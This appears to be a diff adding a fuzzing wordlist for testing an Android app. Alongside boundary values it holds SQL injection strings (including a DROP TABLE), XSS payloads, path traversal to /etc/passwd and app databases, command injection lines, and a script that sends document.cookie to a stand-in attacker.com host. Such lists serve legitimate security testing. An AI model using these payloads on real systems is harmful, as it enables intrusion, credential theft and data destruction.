@@ -1,0 +1,48 @@
+99999
+-999999
+9999999999999999999999999
+111.111
+12312421412412.124124124124124214
+-.412
+-123214142141241241241
+-1212312312313213.1231231231231
+1.1.1.1
+@#$%@#!$
+test
+user@example.com
+@$@#SSAD
+123214
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+null
+NUL
+空
+0x41414141
+😈
+😈😈😈😈😈😈😈😈😈😈😈
+https://www.google.com
+' " ` ; < > () {} [] %00 %0A %0D %25
+../../../../../../etc/passwd
+../../../data/data/com.example.app/databases/
+' OR '1'='1
+' UNION SELECT null, sqlite_version() --
+' AND (SELECT COUNT(*) FROM sqlite_master) > 0 --
+'; DROP TABLE users; --
+" OR "" = "
+' OR 1=1--
+"><script>alert('XSS')</script>
+<svg/onload=alert('XSS')>
+"><img src=x onerror=alert('XSS')>
+javascript:alert('XSS')
+; ls -la;
+`id`
+$(whoami)
+| cat /etc/passwd
+& ping -c 4 attacker.com
+../../../etc/passwd
+../../../../data/data/com.example.app/
+%2e%2e%2f%2e%2e%2fetc/passwd
+..%c0%af../system/build.prop
+<crashme>
+<script>document.location='http://attacker.com?cookie='+document.cookie</script>
+content://com.android.calendar/events
+intent:#Intent;action=android.intent.action.VIEW;S.browser_fallback_url=javascript:alert(1);end
